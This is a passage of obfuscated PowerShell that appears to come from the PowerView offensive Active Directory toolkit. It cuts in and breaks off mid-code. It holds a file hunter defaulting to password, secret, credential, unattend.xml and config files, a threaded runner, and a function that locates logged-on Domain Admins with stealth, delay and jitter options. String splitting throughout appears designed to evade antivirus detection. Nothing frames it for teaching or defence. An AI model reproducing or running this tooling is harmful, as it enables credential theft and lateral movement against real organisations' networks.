        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $Path =   '.\',

        [Parameter(pARametersEtNAME  =  "FI`lEspEcific`A`TION" )]
        [ValidateNotNullOrEmpty( )]
        [Alias({"{0}{2}{3}{1}" -f'S','rms','earch','Te'}, {"{1}{0}" -f 'ms','Ter'})]
        [String[]]
        $Include =  @(( "{1}{2}{0}{3}" -f 'sw','*p','as','ord*'), (  "{0}{3}{1}{2}" -f'*','nsitive','*','se'), (  "{2}{1}{0}" -f 'in*','adm','*' ), ( "{2}{1}{0}"-f'*','in','*log' ), ( "{1}{2}{0}" -f 'cret*','*s','e' ), (  "{0}{2}{3}{1}"-f'u','d*.xml','natt','en'  ), ( "{0}{1}"-f'*.vm','dk'), (  "{1}{0}" -f 's*','*cred'), ("{1}{2}{0}"-f'*','*credent','ial' ), ("{1}{0}"-f 'fig','*.con' )),

        [Parameter(PARaMETersETnaMe = "File`Sp`E`ciFiCatIon" )]
        [ValidateNotNullOrEmpty(   )]
        [DateTime]
        $LastAccessTime,

        [Parameter( PARAmetERSeTnAmE   =  "f`I`LESPEc`If`ICATiON"  )]
        [ValidateNotNullOrEmpty(    )]
        [DateTime]
        $LastWriteTime,

        [Parameter(  PAraMEterSETNAME   = "FiLe`s`peC`if`ICAt`iON")]
        [ValidateNotNullOrEmpty(  )]
        [DateTime]
        $CreationTime,

        [Parameter(parAMeTERsetNAMe =   "oF`FiCED`oCs" )]
        [Switch]
        $OfficeDocs,

        [Parameter( paRAmeteRsetNAme =  "fresh`ex`eS" )]
        [Switch]
        $FreshEXEs,

        [Parameter(PaRameTeRsETNaMe  =  "FIL`esPECiFi`Cat`ion")]
        [Switch]
        $ExcludeFolders,

        [Parameter( pAramETErSetNaMe  =  "Fil`e`s`pecifi`Cat`iON")]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =   [Management.Automation.PSCredential]::eMpty
     )

    BEGIN {
        $SearcherArguments   =  @{
            (  "{0}{1}"-f'Recu','rse' )  =   $True
            ("{1}{0}{2}" -f 'Actio','Error','n'  )   = ("{0}{1}{2}{3}"-f'Si','lentlyCont','in','ue' )
            ("{1}{0}" -f 'de','Inclu')  = $Include
        }
        if ( $PSBoundParameters[( "{2}{0}{1}"-f 'Doc','s','Office'  )] ) {
            $SearcherArguments[( "{0}{1}"-f'In','clude'  )]  =   @((  "{0}{1}" -f '*','.doc'), (  "{0}{2}{1}"-f '*','ocx','.d'), ( "{1}{0}"-f 's','*.xl'), ( "{0}{1}"-f'*.xl','sx'  ), ( "{1}{0}" -f'pt','*.p'  ), ( "{0}{1}" -f'*.pp','tx' )  )
        }
        elseif ($PSBoundParameters[("{0}{2}{1}"-f'F','XEs','reshE')] ) {
            
            $LastAccessTime  = (Get-Date ).AdddAYs(-7).ToStRIng( ("{2}{0}{1}" -f '/','dd/yyyy','MM'  ) )
            $SearcherArguments[( "{1}{0}"-f'de','Inclu')] =   @((  "{0}{1}"-f'*.e','xe'  ))
        }
        $SearcherArguments[(  "{0}{1}" -f'Fo','rce' )]  =   -not $PSBoundParameters[( "{0}{2}{1}" -f 'ExcludeHi','n','dde')]

        $MappedComputers  =  @{}

        function T`esT-wr`I`Te {
            
            [CmdletBinding(  )]Param(  [String]$Path)
            try {
                $Filetest  =   [IO.File]::oPENwriTE(  $Path)
                $Filetest.cLOSE( )
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path  ) {
            if ((  $TargetPath -Match ( (("{4}{3}{0}{1}{2}" -f 'WAkWA','k','.*','WAkWAkWAk.*','WAk') ).rEplAce( 'WAk',[sTRinG][cHaR]92 ) )) -and ($PSBoundParameters[( "{0}{1}{2}" -f'C','r','edential')])) {
                $HostComputer   = (  New-Object (  'Syste'+'m.U'+'ri'  )($TargetPath)  ).Host
                if (-not $MappedComputers[$HostComputer] ) {
                    
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments[("{1}{0}"-f 'th','Pa'  )] =   $TargetPath
            Get-ChildItem @SearcherArguments   |   ForEach-Object {
                
                $Continue   =  $True
                if (  $PSBoundParameters[( "{0}{1}{2}{3}"-f'Exclude','Folde','r','s')] -and ($_.pSIsCOntaINEr  ) ) {
                    Write-Verbose "Excluding: $($_.FullName) "
                    $Continue   =  $False
                }
                if (  $LastAccessTime -and ( $_.lAsTACCEsstImE -lt $LastAccessTime  ) ) {
                    $Continue =   $False
                }
                if ($PSBoundParameters[("{2}{1}{3}{0}"-f'me','astWriteT','L','i')] -and ( $_.LAstWriTetImE -lt $LastWriteTime)) {
                    $Continue   = $False
                }
                if ($PSBoundParameters[("{3}{0}{1}{2}" -f'r','e','ationTime','C' )] -and (  $_.cREATIOntimE -lt $CreationTime ) ) {
                    $Continue  = $False
                }
                if (  $PSBoundParameters[( "{0}{1}{3}{2}"-f'Che','ckW','ccess','riteA')] -and (-not (Test-Write -Path $_.FULLnaMe )) ) {
                    $Continue = $False
                }
                if ( $Continue) {
                    $FileParams =   @{
                        ("{1}{0}" -f 'th','Pa')  = $_.FullnAME
                        (  "{0}{1}" -f'O','wner'  )   =   $((  Get-Acl $_.fulLNAME ).owNER)
                        ( "{1}{0}{2}{3}{4}"-f'a','L','s','tA','ccessTime' )   =  $_.lAsTacCesSTIMe
                        ("{4}{3}{2}{1}{0}" -f 'e','m','Ti','rite','LastW' ) = $_.LAStwRitETIME
                        (  "{1}{0}{3}{2}" -f 'i','CreationT','e','m')   = $_.creatIONtImE
                        ( "{0}{2}{1}"-f 'L','th','eng'  ) = $_.LENgtH
                    }
                    $FoundFile   =   New-Object -TypeName ('PSO'+'b'+  'ject') -Property $FileParams
                    $FoundFile.PSoBJECt.tYpenaMes.inSErT(  0, ("{3}{0}{2}{1}"-f'owerVi','oundFile','ew.F','P'  ) )
                    $FoundFile
                }
            }
        }
    }

    END {
        
        $MappedComputers.KeYS |   Remove-RemoteConnection
    }
}








function n`eW-`T`HrEa`DEDFunctION {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{3}{5}{8}{7}{11}{1}{4}{2}{10}{9}{6}" -f'PSUseShouldP','g','g','r','in','ocessF','tions','tateC','orS','c','Fun','han'}, ''  )]
    [CmdletBinding(   )]
    Param(  
        [Parameter(POSITIOn  =   0, MANDAtOry   =   $True, VALuEFROMPIpELiNE =   $True, valUeFRompiPeLinEbyPropeRTynAMe =   $True)]
        [String[]]
        $ComputerName,

        [Parameter( PoSitIoN  = 1, mAndATORy  =  $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(  pOsITION =   2 )]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100 )]
        $Threads  = 20,

        [Switch]
        $NoImports
     )

    BEGIN {
        
        
        $SessionState  =   [System.Management.Automation.Runspaces.InitialSessionState]::createDeFAuLt(   )

        
        
        $SessionState.APArtmeNtSTatE   =  [System.Threading.ApartmentState]::sTa

        
        
        if (  -not $NoImports ) {
            
            $MyVars =   Get-Variable -Scope 2

            
            $VorbiddenVars  = @('?',("{1}{0}"-f'gs','ar' ),("{1}{2}{0}{4}{3}"-f'eFileNa','Co','nsol','e','m' ),(  "{1}{0}"-f'rror','E'  ),("{2}{0}{3}{1}"-f'u','ntext','Exec','tionCo'  ),(  "{1}{0}" -f'lse','fa'),("{1}{0}"-f'OME','H' ),(  "{0}{1}"-f'Ho','st'),("{1}{0}"-f'nput','i'),( "{2}{1}{0}"-f 'ct','putObje','In'),( "{3}{4}{2}{1}{5}{0}"-f 'sCount','li','mA','M','aximu','a'),( "{3}{0}{4}{2}{1}" -f'mDriv','nt','u','Maximu','eCo' ),(  "{1}{2}{4}{0}{3}"-f 'rorCou','M','axi','nt','mumEr' ),("{1}{0}{4}{3}{2}"-f 'nctio','MaximumFu','ount','C','n'  ),( "{0}{2}{3}{1}" -f 'M','nt','aximumHistoryC','ou'),("{5}{3}{4}{0}{2}{1}"-f 'e','t','Coun','aximu','mVariabl','M'),("{2}{0}{1}" -f'oca','tion','MyInv' ),("{0}{1}"-f'nu','ll'),'PID',( "{1}{3}{2}{0}"-f'rs','PSBo','dParamete','un'  ),( "{0}{1}{3}{2}"-f 'PS','Com','Path','mand'),(  "{1}{2}{0}" -f 're','PS','Cultu' ),( "{1}{2}{0}{4}{3}"-f 'ameterV','PSDefa','ultPar','ues','al' ),(  "{1}{0}"-f 'E','PSHOM'),("{2}{3}{0}{1}"-f'pt','Root','P','SScri' ),("{2}{0}{1}" -f 'UI','Culture','PS' ),(  "{2}{3}{0}{1}"-f 'a','ble','PSVe','rsionT'  ),'PWD',( "{1}{0}{2}"-f 'he','S','llId' ),( "{3}{0}{2}{1}" -f 'chro','izedHash','n','Syn' ),("{0}{1}"-f't','rue' ) )

            
            ForEach ($Var in $MyVars ) {
                if ($VorbiddenVars -NotContains $Var.name) {
                $SessionState.variabLES.ADd( (  New-Object -TypeName ( 'System' + '.Mana' +  'gement.Autom' +'ation.Runspa'+'ces'+'.Ses' + 'sion'+'Stat'  + 'eVa'+  'ri'  + 'able'  +  'Ent'+  'r'  +  'y') -ArgumentList $Var.naME,$Var.valUe,$Var.DEscRIpTIoN,$Var.oPtiOns,$Var.aTTRibUTES )  )
                }
            }

            
            ForEach ($Function in ( Get-ChildItem ( 'Funct'+'ion:'  ))) {
                $SessionState.cOMmanDs.ADd((  New-Object -TypeName (  'System' + '.Management.Au' +  'tom' +  'ation.' + 'Runs'+ 'pa' + 'ces.Sess'+'ionStat'  +'e'  + 'F'+  'unct'  +'ionE'  + 'n'+ 'tr'  + 'y' ) -ArgumentList $Function.naMe, $Function.dEfInITIoN  ) )
            }
        }

        
        
        

        
        $Pool  =  [RunspaceFactory]::crEatERunSPACePoOL( 1, $Threads, $SessionState, $Host  )
        $Pool.OpeN( )

        
        $Method   = $Null
        ForEach ( $M in [PowerShell].gETmETHodS( ) |   Where-Object { $_.NamE -eq (  "{2}{1}{0}{3}" -f'nvo','inI','Beg','ke') }  ) {
            $MethodParameters  =  $M.getPAraMEtERS(  )
            if ( (  $MethodParameters.COunt -eq 2 ) -and $MethodParameters[0].NaMe -eq (  "{0}{1}" -f'inp','ut'  ) -and $MethodParameters[1].namE -eq ("{0}{1}"-f 'o','utput'  )  ) {
                $Method =  $M.MAkEGeneRicMETHOD(  [Object], [Object])
                break
            }
        }

        $Jobs  =   @( )
        $ComputerName =   $ComputerName   | Where-Object {$_ -and $_.trim( )}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if ($Threads -ge $ComputerName.LEnGTH ) {
            $Threads = $ComputerName.lENgtH
        }
        $ElementSplitSize   =   [Int](  $ComputerName.leNGth/$Threads )
        $ComputerNamePartitioned =  @()
        $Start  = 0
        $End   =   $ElementSplitSize

        for( $i  = 1; $i -le $Threads ;   $i++) {
            $List   = New-Object ('Syst'  +  'em.Col' +  'l'  +'e'  + 'ctions.Array'+'Lis'+ 't' )
            if ( $i -eq $Threads ) {
                $End =  $ComputerName.leNGth
            }
            $List.ADDrAnGe($ComputerName[$Start..( $End-1 )])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.tOArrAY( )  )  )
        }

        Write-Verbose (  '[' + 'New'+'-Threa' +  'dedFunction] '  +  'Tot'  +'al '  + 'nu'+'mbe'  +  'r '+'o'  + 'f '  +'thread'  +  's/partit'+  'ions:'  +' '+  "$Threads")

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            
            $PowerShell  = [PowerShell]::CREaTE( )
            $PowerShell.RUNSpaCepooL   = $Pool

            
            $Null   = $PowerShell.ADdSCrIPT(  $ScriptBlock  ).ADdPaRAMeter(  (  "{3}{2}{0}{1}" -f'a','me','puterN','Com' ), $ComputerNamePartition  )
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GeteNuMeRAtOR(  ) ) {
                    $Null   = $PowerShell.ADdPARamEter($Param.Name, $Param.VaLUe )
                }
            }

            
            $Output   =   New-Object ('Man'  +'agement.A'  +  'ut'+'omation.' + 'PSData'  + 'Co'+'llec'  + 'tion[Object]' )

            
            $Jobs += @{
                pS = $PowerShell
                OUtPut  =   $Output
                ResulT =  $Method.InVOkE($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose (  "{1}{5}{3}{8}{6}{7}{4}{2}{0}" -f 'ting','[New-Th','u','dedFun',' exec','rea','on] T','hreads','cti')

        
        Do {
            ForEach ( $Job in $Jobs ) {
                $Job.oUtPut.rEadalL()
            }
            Start-Sleep -Seconds 1
        }
        While (  ( $Jobs   |   Where-Object { -not $_.RESuLt.IScOMPLETeD }).counT -gt 0  )

        $SleepSeconds  = 100
        Write-Verbose (  '[N' +  'e'  + 'w-Threade'  + 'dFun' +  'ction'  + '] '+  'Waitin' +'g '  +  "$SleepSeconds "  + 'sec'  +  'o'+'nds '  + 'fo'+ 'r '+  'fi'  +  'nal'  +' '+'cle'+  'a'  +  'nup...' )

        
        for ($i  =  0 ;   $i -lt $SleepSeconds  ; $i++  ) {
            ForEach (  $Job in $Jobs ) {
                $Job.oUtPuT.ReADaLL()
                $Job.PS.DISPOsE(  )
            }
            Start-Sleep -S 1
        }

        $Pool.DIspOSe( )
        Write-Verbose (  "{12}{11}{3}{10}{2}{0}{4}{1}{6}{9}{7}{8}{5}" -f 'ctio','thr','n','e','n] all ','eted','ea','mp','l','ds co','dFu','-Thread','[New')
    }
}


function FINd-d`o`m`AinU`s`e`RLoCATIOn {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{4}{3}{1}"-f 'u','rocess','PSSho','P','ld'}, ''  )]
    [OutputType({"{4}{3}{1}{0}{2}" -f'ti','a','on','Loc','PowerView.User'} )]
    [CmdletBinding(  DEfAultpAramETERSeTNAMe   = {"{3}{1}{2}{0}{4}" -f'Iden','rGro','up','Use','tity'})]
    Param(
        [Parameter(  pOSItion  =   0, valUEFROMPIPelINe = $True, vaLuEFrOMpIpELINeBypROPERTynAME  =  $True  )]
        [Alias(  {"{1}{2}{0}" -f 'e','DNSHost','Nam'} )]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $ComputerSearchBase,

        [Alias( {"{3}{2}{0}{1}" -f'str','ained','n','Unco'} )]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{2}{3}{1}{0}" -f'm','yste','Oper','atingS'} )]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{2}{0}"-f 'ck','Servic','ePa'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{2}{1}{0}" -f 'ame','iteN','S'} )]
        [String]
        $ComputerSiteName,

        [Parameter(PaRaMeteRseTNAme = "US`ERI`D`enTiTy")]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $UserSearchBase,

        [Parameter(  PaRAMeteRsetNAMe   =  "USeRGr`o`UPID`E`NTItY" )]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'oupN','Gr','ame'}, {"{1}{0}" -f 'p','Grou'}  )]
        [String[]]
        $UserGroupIdentity   = ("{1}{0}{2}"-f 'om','D','ain Admins' ),

        [Alias({"{2}{3}{0}{1}" -f'Co','unt','Adm','in'} )]
        [Switch]
        $UserAdminCount,

        [Alias(  {"{1}{3}{0}{2}"-f'ti','AllowDeleg','on','a'})]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{1}{0}{3}{2}"-f 'on','DomainC','ller','tro'} )]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}"-f'se','Ba'}, {"{0}{1}"-f'OneLeve','l'}, {"{1}{0}" -f'ubtree','S'})]
        [String]
        $SearchScope = ( "{1}{0}"-f'tree','Sub'  ),

        [ValidateRange(  1, 10000 )]
        [Int]
        $ResultPageSize   = 200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential = [Management.Automation.PSCredential]::EmpTy,

        [Switch]
        $StopOnSuccess,

        [ValidateRange( 1, 10000 )]
        [Int]
        $Delay  = 0,

        [ValidateRange(  0.0, 1.0)]
        [Double]
        $Jitter   =   .3,

        [Parameter(parAMEtErsetNAME =   "SHo`Wa`LL"  )]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet( 'DFS', 'DC', {"{1}{0}" -f'e','Fil'}, 'All'  )]
        $StealthSource =  'All',

        [Int]
        [ValidateRange( 1, 100  )]
        $Threads  = 20
     )

    BEGIN {

        $ComputerSearcherArguments   =  @{
            (  "{1}{2}{0}"-f 'es','Pro','perti' )  =  (  "{2}{0}{1}"-f 'hostnam','e','dns' )
        }
        if ( $PSBoundParameters[(  "{0}{2}{1}" -f'D','ain','om'  )] ) { $ComputerSearcherArguments[(  "{1}{0}" -f 'ain','Dom' )]   =   $Domain }
        if ($PSBoundParameters[( "{2}{1}{0}{3}" -f 'pute','om','C','rDomain' )] ) { $ComputerSearcherArguments[("{2}{0}{1}"-f'oma','in','D' )] =  $ComputerDomain }
        if ($PSBoundParameters[("{0}{3}{1}{2}{4}" -f'Co','er','LDAPFil','mput','ter'  )] ) { $ComputerSearcherArguments[( "{0}{1}{2}"-f 'LDAP','Filt','er'  )]   =   $ComputerLDAPFilter }
        if ($PSBoundParameters[(  "{3}{4}{1}{0}{2}"-f 'chB','terSear','ase','Comp','u' )]) { $ComputerSearcherArguments[("{0}{1}{2}" -f 'Sear','chB','ase' )] =   $ComputerSearchBase }
        if (  $PSBoundParameters[(  "{1}{0}{2}" -f'nconstrain','U','ed')]  ) { $ComputerSearcherArguments[(  "{3}{2}{1}{0}" -f'ined','ra','st','Uncon'  )] =   $Unconstrained }
        if ( $PSBoundParameters[( "{6}{4}{0}{2}{1}{5}{3}" -f'rO','ngS','perati','m','mpute','yste','Co'  )]) { $ComputerSearcherArguments[("{0}{2}{3}{1}" -f 'Op','ystem','erati','ngS' )]  =   $OperatingSystem }
        if ( $PSBoundParameters[("{4}{1}{0}{3}{5}{2}" -f 'Se','mputer','k','rvice','Co','Pac'  )] ) { $ComputerSearcherArguments[( "{0}{2}{1}" -f 'S','k','ervicePac' )]   =   $ServicePack }
        if (  $PSBoundParameters[(  "{1}{2}{3}{4}{0}" -f 'e','Comp','uterSite','N','am')]) { $ComputerSearcherArguments[("{1}{0}{2}"-f 'ite','S','Name' )] = $SiteName }
        if ( $PSBoundParameters[(  "{1}{0}" -f 'er','Serv' )] ) { $ComputerSearcherArguments[( "{1}{0}{2}" -f've','Ser','r' )]  =  $Server }
        if ($PSBoundParameters[("{1}{0}{2}{3}" -f 'ear','S','chSc','ope' )]) { $ComputerSearcherArguments[(  "{3}{1}{2}{0}"-f'chScope','ea','r','S'  )]  = $SearchScope }
        if ($PSBoundParameters[(  "{2}{3}{1}{4}{0}" -f'ze','age','Resul','tP','Si'  )] ) { $ComputerSearcherArguments[("{1}{2}{0}{3}"-f'ageSiz','Re','sultP','e' )]  =  $ResultPageSize }
        if (  $PSBoundParameters[("{1}{2}{0}{3}" -f 'meLim','S','erverTi','it'  )]  ) { $ComputerSearcherArguments[("{2}{3}{0}{1}"-f'Lim','it','ServerTim','e'  )]   =  $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'T','o','mbstone'  )]) { $ComputerSearcherArguments[( "{0}{1}" -f'To','mbstone' )]   = $Tombstone }
        if ( $PSBoundParameters[("{1}{2}{0}" -f 'ential','Cr','ed')] ) { $ComputerSearcherArguments[(  "{1}{0}{2}"-f'e','Cred','ntial')]  = $Credential }

        $UserSearcherArguments   = @{
            ("{0}{1}{2}" -f 'Pr','op','erties'  )   = ("{1}{3}{4}{2}{0}"-f'ountname','sa','cc','m','a'  )
        }
        if (  $PSBoundParameters[( "{2}{3}{0}{1}"-f'erIdent','ity','U','s'  )] ) { $UserSearcherArguments[("{0}{1}"-f'Id','entity')]  =  $UserIdentity }
        if ( $PSBoundParameters[( "{1}{0}" -f'in','Doma')]) { $UserSearcherArguments[( "{1}{0}"-f'omain','D'  )] = $Domain }
        if (  $PSBoundParameters[(  "{2}{3}{1}{0}"-f'ain','rDom','Us','e' )] ) { $UserSearcherArguments[(  "{2}{1}{0}" -f 'in','ma','Do' )]   =  $UserDomain }
        if ( $PSBoundParameters[(  "{1}{0}{2}" -f 'APFi','UserLD','lter'  )]  ) { $UserSearcherArguments[(  "{0}{3}{2}{1}" -f'LD','Filter','P','A'  )] =   $UserLDAPFilter }
        if (  $PSBoundParameters[(  "{1}{3}{0}{2}"-f 'ear','U','chBase','serS' )]) { $UserSearcherArguments[( "{0}{1}{2}" -f'Searc','hB','ase' )] = $UserSearchBase }
        if ($PSBoundParameters[( "{0}{2}{1}{3}"-f'Us','dminCou','erA','nt')]) { $UserSearcherArguments[("{2}{0}{1}{3}"-f'min','Cou','Ad','nt'  )] = $UserAdminCount }
        if (  $PSBoundParameters[("{2}{4}{3}{1}{0}{5}" -f 'Dele','llow','U','A','ser','gation'  )]) { $UserSearcherArguments[(  "{1}{3}{0}{2}" -f 'Delega','Allo','tion','w')]  =   $UserAllowDelegation }
        if ( $PSBoundParameters[("{1}{2}{0}"-f 'er','Ser','v' )]) { $UserSearcherArguments[(  "{0}{1}"-f 'Serve','r'  )]  =  $Server }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Searc','hSco','pe' )] ) { $UserSearcherArguments[(  "{1}{2}{3}{0}" -f'cope','S','e','archS')]  = $SearchScope }
        if ( $PSBoundParameters[(  "{1}{2}{0}{3}" -f'tPage','Res','ul','Size'  )] ) { $UserSearcherArguments[(  "{0}{3}{4}{1}{2}"-f 'R','e','Size','e','sultPag')]   = $ResultPageSize }
        if (  $PSBoundParameters[( "{0}{1}{2}{3}"-f 'S','erverTimeLi','mi','t')] ) { $UserSearcherArguments[("{1}{0}{2}{3}" -f'er','Serv','TimeLi','mit'  )]   =  $ServerTimeLimit }
        if (  $PSBoundParameters[( "{2}{1}{0}"-f 'ne','bsto','Tom')]) { $UserSearcherArguments[("{1}{2}{0}{3}"-f 'sto','To','mb','ne')] =   $Tombstone }
        if ( $PSBoundParameters[( "{2}{1}{0}"-f'ential','d','Cre' )] ) { $UserSearcherArguments[(  "{2}{0}{1}" -f'redenti','al','C'  )]  =  $Credential }

        $TargetComputers  =  @(  )

        
        if ( $PSBoundParameters[("{2}{0}{1}" -f 't','erName','Compu' )]) {
            $TargetComputers  =  @($ComputerName)
        }
        else {
            if ($PSBoundParameters[(  "{1}{0}" -f'h','Stealt')]  ) {
                Write-Verbose ('[Find-' +'D' +'omainUse'+ 'rL' +  'ocation] ' +'St'  + 'e'  +'alth '  +'enumera' +  't'+  'i'  +'on '  +  'us'+  'ing' +  ' '+  'source'  +':'+  ' '+ "$StealthSource" )
                $TargetComputerArrayList = New-Object ('Sys'  +  't' + 'em.Col' +  'l'+  'e'  +'ctions.Array'  +'Lis'  + 't'  )

                if ($StealthSource -match (((  "{0}{1}{2}" -f'F','ile82f','All') )  -CrEPlacE  '82f',[cHAR]124  ) ) {
                    Write-Verbose ("{6}{5}{2}{8}{4}{3}{1}{7}{0}" -f 's','v','ation] Querying ','r','se','DomainUserLoc','[Find-','er','for file ')
                    $FileServerSearcherArguments  =  @{}
                    if (  $PSBoundParameters[( "{1}{0}"-f 'in','Doma')] ) { $FileServerSearcherArguments[(  "{1}{0}"-f 'omain','D'  )] =   $Domain }
                    if ($PSBoundParameters[(  "{3}{0}{1}{2}" -f'ompute','rD','omain','C'  )] ) { $FileServerSearcherArguments[( "{0}{1}" -f 'Doma','in' )]  =   $ComputerDomain }
                    if (  $PSBoundParameters[("{4}{0}{1}{3}{2}"-f'o','m','archBase','puterSe','C')]  ) { $FileServerSearcherArguments[( "{1}{2}{0}"-f'e','SearchBa','s')]   =  $ComputerSearchBase }
                    if ( $PSBoundParameters[(  "{0}{1}"-f 'Serv','er'  )]) { $FileServerSearcherArguments[(  "{0}{1}" -f'Serv','er'  )]   =  $Server }
                    if (  $PSBoundParameters[( "{1}{2}{0}"-f'e','Sear','chScop')] ) { $FileServerSearcherArguments[(  "{1}{0}{2}"-f 'o','SearchSc','pe' )]  = $SearchScope }
                    if ($PSBoundParameters[("{0}{3}{1}{2}{4}" -f 'R','age','Siz','esultP','e')]  ) { $FileServerSearcherArguments[(  "{0}{1}{2}"-f'ResultP','ageS','ize' )] = $ResultPageSize }
                    if ( $PSBoundParameters[(  "{0}{2}{1}{4}{3}" -f'Se','rT','rve','imit','imeL'  )]) { $FileServerSearcherArguments[( "{1}{4}{2}{0}{3}" -f 'mi','Ser','Li','t','verTime')] =  $ServerTimeLimit }
                    if (  $PSBoundParameters[(  "{0}{2}{1}" -f 'Tombsto','e','n')]  ) { $FileServerSearcherArguments[(  "{1}{2}{0}" -f'tone','T','ombs' )] =  $Tombstone }
                    if ($PSBoundParameters[(  "{2}{0}{1}" -f'eden','tial','Cr' )]  ) { $FileServerSearcherArguments[("{0}{2}{1}"-f 'Credent','l','ia' )]   = $Credential }
                    $FileServers   =   Get-DomainFileServer @FileServerSearcherArguments
                    if ( $FileServers -isnot [System.Array] ) { $FileServers =   @($FileServers) }
                    $TargetComputerArrayList.aDDrangE( $FileServers  )
                }
                if ($StealthSource -match ( ( (  "{3}{0}{1}{2}" -f 'FS','PH','8All','D' )  )-rEPlaCE ( [chAR]80+[chAR]72+  [chAR]56 ),[chAR]124 )) {
                    Write-Verbose ( "{10}{0}{1}{7}{4}{12}{6}{3}{9}{5}{8}{11}{2}" -f'ind-Dom','ain','s','n','rLoca','or ','on] Queryi','Use','DF','g f','[F','S server','ti')
                    
                    
                }
                if (  $StealthSource -match ((  'DC{0}All'  )-F  [ChAR]124  )  ) {
                    Write-Verbose (  "{5}{9}{13}{10}{1}{11}{8}{2}{15}{3}{0}{6}{4}{12}{7}{14}{16}{17}"-f 'fo','a','Queryin',' ','ai','[Fi','r dom','ont','on] ','nd-D','oc','ti','n c','omainUserL','r','g','oll','ers'  )
                    $DCSearcherArguments  =   @{
                        (  "{0}{1}"-f'L','DAP'  ) =  $True
                    }
                    if ( $PSBoundParameters[("{0}{1}" -f'D','omain')]) { $DCSearcherArguments[("{2}{1}{0}"-f 'in','ma','Do'  )]  =  $Domain }
                    if ( $PSBoundParameters[("{2}{1}{3}{0}"-f 'rDomain','put','Com','e'  )]) { $DCSearcherArguments[(  "{1}{0}{2}"-f 'ai','Dom','n')] =  $ComputerDomain }
                    if ($PSBoundParameters[(  "{0}{2}{1}"-f'Ser','er','v' )]) { $DCSearcherArguments[( "{1}{0}" -f'rver','Se')]  =  $Server }
                    if ( $PSBoundParameters[( "{2}{1}{0}" -f 'ial','dent','Cre'  )]  ) { $DCSearcherArguments[(  "{1}{2}{0}" -f 'l','Credent','ia'  )] = $Credential }
                    $DomainControllers  =   Get-DomainController @DCSearcherArguments |  Select-Object -ExpandProperty (  'd'  + 'ns'  +'hostname' )
                    if ($DomainControllers -isnot [System.Array]  ) { $DomainControllers  =  @($DomainControllers) }
                    $TargetComputerArrayList.ADdrangE(  $DomainControllers  )
                }
                $TargetComputers   =  $TargetComputerArrayList.TOArray(   )
            }
            else {
                Write-Verbose ( "{2}{3}{10}{15}{5}{9}{7}{11}{6}{16}{4}{18}{1}{17}{13}{19}{14}{12}{8}{0}" -f 'ain','fo','[Fin','d','in','omainUs','er','rLocation] Q',' dom','e','-','u','rs in the','ll','te','D','y','r a','g ',' compu' )
                $TargetComputers   = Get-DomainComputer @ComputerSearcherArguments  |  Select-Object -ExpandProperty (  'dn' + 'shost' + 'na'+'me'  )
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (  $TargetComputers.leNGTH -eq 0 ) {
            throw ("{7}{1}{4}{11}{10}{8}{6}{2}{0}{3}{5}{9}"-f'erLocation] No hosts fo','n','s','und to enum','d-D','erat','nU','[Fi','i','e','a','om' )
        }

        
        if (  $PSBoundParameters[("{1}{2}{3}{0}" -f 'ial','Cr','ed','ent')]  ) {
            $CurrentUser   =  $Credential.gETneTwOrkcrEDENtiAl(  ).USERnAME
        }
        else {
            $CurrentUser   =   (  [Environment]::userNAme ).TolOweR( )
        }

        
        if ($PSBoundParameters[(  "{0}{1}"-f 'Sh','owAll'  )] ) {
            $TargetUsers  = @( )
        }
        elseif ($PSBoundParameters[(  "{0}{1}{2}{3}"-f 'UserIde','nt','i','ty')] -or $PSBoundParameters[( "{4}{0}{2}{3}{1}"-f 'erLD','r','APFi','lte','Us'  )] -or $PSBoundParameters[(  "{0}{1}{2}"-f 'U','ser','SearchBase' )] -or $PSBoundParameters[( "{0}{3}{2}{1}" -f'Us','nt','ou','erAdminC' )] -or $PSBoundParameters[( "{4}{2}{0}{3}{1}" -f'lo','legation','erAl','wDe','Us'  )]  ) {
